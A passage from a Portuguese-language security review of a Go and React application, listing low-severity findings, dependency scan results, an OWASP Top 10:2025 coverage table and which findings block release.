comum auditado — leio como **decisão registrada** e não reporto. Para
`encerrar_plano` não achei registro equivalente em `plano-acao`. Vale confirmar
com o `analista-requisitos` antes de mexer.

**B-6 · Desreferência de ponteiro possivelmente nulo.**
`criar_indicador.go:37`: `indicador.NovoDaInstituicao(*esc.InstituicaoID(), ...)`.
Hoje inalcançável (nenhum perfil sem instituição tem `indicador.gerenciar`); se um
dia tiver, é `panic` recuperado pelo `gin.Recovery` → 500. Fail-closed, mas por
acidente.

**B-7 · Dependências — saída real das varreduras desta rodada.**

`govulncheck` (container `backend`, `go.mod` de `backend/`):

```
=== Symbol Results ===
No vulnerabilities found.
Your code is affected by 0 vulnerabilities.
This scan also found 0 vulnerabilities in packages you import and 6
vulnerabilities in modules you require, but your code doesn't appear to call
these vulnerabilities.
```

Detalhamento (`-show verbose`):

| # | ID | Módulo | Em uso | Corrigido em |
|---|---|---|---|---|
| 1 | GO-2026-6355 | `golang.org/x/crypto` | v0.54.0 | **v0.56.0** |
| 2 | GO-2026-6354 | `golang.org/x/crypto` | v0.54.0 | **v0.56.0** |
| 3 | GO-2026-6303 | `golang.org/x/crypto` | v0.54.0 | **v0.55.0** |
| 4 | GO-2026-6180 | `golang.org/x/mod` | v0.37.0 | **v0.40.0** |
| 5 | GO-2026-6179 | `golang.org/x/mod` | v0.37.0 | **v0.40.0** |
| 6 | GO-2026-5932 | `golang.org/x/crypto` | v0.54.0 | *sem correção* |

**Não classifico como Crítico**, ao contrário do C-1 do ciclo anterior
(`quic-go`), porque ali o `govulncheck` apontava o código como **afetado**, com
traço de chamada; aqui a análise de símbolos não alcança nenhuma das seis.
Registro assim mesmo porque `golang.org/x/crypto` é dependência **direta**
(`go.mod:17`) e é de onde vem o `argon2id` de senha, e porque a restrição §15.19 da
autenticação diz que dependência com correção publicada é atualizada, em PR
próprio. O `quic-go` da revisão anterior **saiu da lista** — foi corrigido.

`npm audit --audit-level=high` (container `frontend`):

```
found 0 vulnerabilities
```
901 dependências (350 prod, 514 dev, 190 opcionais, 67 peer).

**B-8 · A3 — licença e alcance do guarda C.**
(i) `docker-compose.dev.yml` usa `zenko/cloudserver` (**AGPLv3**) no lugar do MinIO,
com o motivo documentado no próprio arquivo. Serviço separado, falado por API S3,
**não distribuído** — e `docker-compose.yaml` de produção não o inclui (S3/MinIO é
infraestrutura externa). Não é bloqueio; é item para o `arquiteto` registrar, já
que o `CLAUDE.md` trata copyleft forte como decisão explícita.
(ii) O guarda C casa pelo **identificador** `EntregaReleRepository`. Como
`postgres.EntregaRepository` implementa as duas interfaces, um handler que
receba o tipo concreto alcançaria os métodos do relê com o guarda verde. Hoje não
acontece; vale como critério para a próxima ampliação do guarda.

**B-9 · Junções sem `excluido_em IS NULL` em `periodo`.**
`relatorio_repository.go:115` (`JOIN periodo ON periodo.id = plano.periodo_id`) e
`entrega_minhas_metas.go:93`. Um período excluído logicamente continua aparecendo
no relatório e no seletor. Integridade de apresentação, sem travessia de fronteira.

---

## 6. Cobertura OWASP Top 10:2025 neste escopo

| # | Categoria | Resultado |
|---|---|---|
| **A01** | Broken Access Control | Mecanismo verificado e íntegro (§2.1, §2.2, §2.3, §2.4). Achados: **A-2** (janela de autorização por fuso), **M-1** (permissão saiu da assinatura da rota), **M-4** (ancoragem de banco ausente). Sem IDOR: todo identificador é UUIDv7 e toda leitura passa por `Escopo`. Sem SSRF: nenhuma feature faz requisição a URL fornecida pelo usuário. |
| **A02** | Security Misconfiguration | `APP_ENV` default `production`; CORS por igualdade exata; Swagger ausente em produção; cabeçalhos presentes nas duas bordas; segredos por variável de ambiente. Achado: **M-3** (`SMTP_TLS` sem efeito). |
| **A03** | Supply Chain | **B-7** — nada alcançável; 5 de 6 com correção publicada. **B-8** — AGPLv3 em imagem de desenvolvimento. |
| **A04** | Cryptographic Failures | Fora do escopo (revisado no ciclo anterior). Nada novo: nenhuma feature nova manipula senha, token ou cifra. `hash_sha256` do anexo é integridade, não segredo. |
| **A05** | Injection | SQL fechado (allowlist em duas camadas, `LIKE` escapado, tudo parametrizado — §2.5). XSS: nenhum `dangerouslySetInnerHTML`. Achados: **A-1** (SMTP), **A-3** (fórmula em CSV), **B-1** (cabeçalho HTTP), **B-2** (marcador em `.docx`). |
| **A06** | Insecure Design | Idempotência presente na rota de comando certa, com chave por usuário. Achado: **M-2** (exclusão mútua declarada e não entregue). |
| **A07** | Auth Failures | Fora do escopo. Perfil derivado de designação com vigência verificado (§2.4): deriva na leitura, sem janela, sem juntar `curso`. |
| **A08** | Data Integrity Failures | Sem desserialização não confiável. O ZIP do anexo é inspecionado com `archive/zip` a partir de buffer já limitado; o modelo `.docx` é `embed`, nunca entrada do usuário. |
| **A09** | Logging Failures | Auditoria na mesma transação em todos os comandos que li; download de anexo e de documento auditado, inclusive o negado; exportação auditada com contagem e filtro. Achados: **B-4**, **B-5**. |
| **A10** | Exceptional Conditions | Erros traduzidos num único ponto, sem vazamento. Achado: **A-2** (falha de fuso que produz silêncio, não erro), **B-6** (nil deref latente). |

---

## 7. Encaminhamento

**Descrevo o problema e o vetor; a solução é decisão do `arquiteto`.**

- **Bloqueiam:** A-1, A-2, A-3.
- **Não bloqueiam, mas enfraquecem garantias que o desenho declara como
  estruturais e que a próxima feature vai herdar:** M-1 e M-4.
- **Já bloqueado por achado anterior:** os comentários no bundle (M-5b) — a
  correção pendente T-096 a T-109 precisa passar a cobrir os cinco arquivos novos.
- **Sem achado:** o mecanismo de isolamento das quatro features. O parêntese está
  lá, o `IS NULL` está lá, a exceção está em exatamente um alvo com teste que a
  congela, a chave de objeto nunca vem do cliente, o download verifica antes de
  ler, e os testes que alegam isso testam isso.
